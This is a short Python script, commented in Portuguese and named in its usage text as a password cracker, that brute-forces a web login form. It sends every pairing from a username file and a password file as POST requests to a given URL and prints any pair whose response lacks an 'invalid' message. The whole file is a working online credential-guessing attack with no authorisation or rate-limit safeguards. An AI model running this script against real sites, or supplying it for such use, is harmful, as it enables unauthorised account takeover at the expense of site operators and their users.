import requests
import sys
import os

def carregar_lista(caminho):
    if not os.path.exists(caminho):
        print(f"Arquivo não encontrado: {caminho}")
        sys.exit(1)
    with open(caminho, "r", encoding="utf-8") as f:
        return [linha.strip() for linha in f if linha.strip()]

def main():
    if len(sys.argv) != 4:
        print("Uso: python3 quebrador_de_senhas.py <url> <usuarios.txt> <senhas.txt>")
        sys.exit(1)

    url = sys.argv[1]
    arquivo_usuarios = sys.argv[2]
    arquivo_senhas = sys.argv[3]

    usuarios = carregar_lista(arquivo_usuarios)
    senhas = carregar_lista(arquivo_senhas)

    print(f"[+] Iniciando brute force em: {url}")
    print(f"[+] Total de usuários: {len(usuarios)} | senhas: {len(senhas)}\n")

    for usuario in usuarios:
        for senha in senhas:
            dados = {
                "usuario": usuario,
                "senha": senha
            }
            try:
                resposta = requests.post(url, data=dados, timeout=10)
                if "inválidos" not in resposta.text and "invalido" not in resposta.text.lower():
                    print(f"[SUCESSO] Usuário: {usuario} | Senha: {senha}")
                    print("Resposta:", resposta.text)
                    return
                else:
                    print(f"[ERRO] {usuario}:{senha}")
            except requests.RequestException as e:
                print(f"[!] Erro de conexão: {e}")
                continue

    print("\n[-] Nenhuma combinação válida encontrada.")

if __name__ == "__main__":
    main()
